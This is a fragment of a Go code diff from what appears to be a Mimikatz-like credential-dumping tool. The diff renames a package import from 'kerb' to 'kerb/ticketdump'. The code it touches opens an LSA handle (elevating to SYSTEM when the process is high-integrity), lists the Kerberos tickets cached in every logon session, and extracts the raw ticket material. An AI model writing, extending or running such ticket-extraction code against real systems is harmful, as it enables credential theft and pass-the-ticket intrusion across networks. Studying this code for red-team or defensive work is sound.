@@ -5,7 +5,7 @@ import (
 	"encoding/hex"
 	"fmt"
 	"io"
-	"katz/katz/modules/kerb"
+	"katz/katz/modules/kerb/ticketdump"
 	"katz/katz/modules/sam"
 	"katz/katz/utils"
 	"strings"
@@ -149,20 +149,20 @@ func GetKerberosTickets() []map[string]interface{} {
 
 	// retrieve LSA handle
 	// if process is high integrity, process token will be elevated to SYSTEM
-	lsaHandle, err := kerb.GetLsaHandle()
+	lsaHandle, err := ticketdump.GetLsaHandle()
 	if err != nil {
 		return nil
 	}
 
 	// get kerberos auth package
-	kerberosString := kerb.NewLSAString("kerberos")
-	authPackage, err := kerb.GetAuthenticationPackage(lsaHandle, kerberosString)
+	kerberosString := ticketdump.NewLSAString("kerberos")
+	authPackage, err := ticketdump.GetAuthenticationPackage(lsaHandle, kerberosString)
 	if err != nil {
 		return nil
 	}
 
 	// list cached kerberos tickets in LSA
-	sessionCreds, err := kerb.EnumerateTickets(lsaHandle, authPackage)
+	sessionCreds, err := ticketdump.EnumerateTickets(lsaHandle, authPackage)
 	if err != nil {
 		return nil
 	}
@@ -176,7 +176,7 @@ func GetKerberosTickets() []map[string]interface{} {
 
 			// fmt.Printf("current process is SYSTEM: %t\n", kerb.IsSystem())
 			// obtain raw ticket material
-			extractedTicket, err := kerb.ExtractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
+			extractedTicket, err := ticketdump.ExtractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
 			// fmt.Printf("extractedTicket: %+v\n", extractedTicket)
 			if err != nil {
 				continue
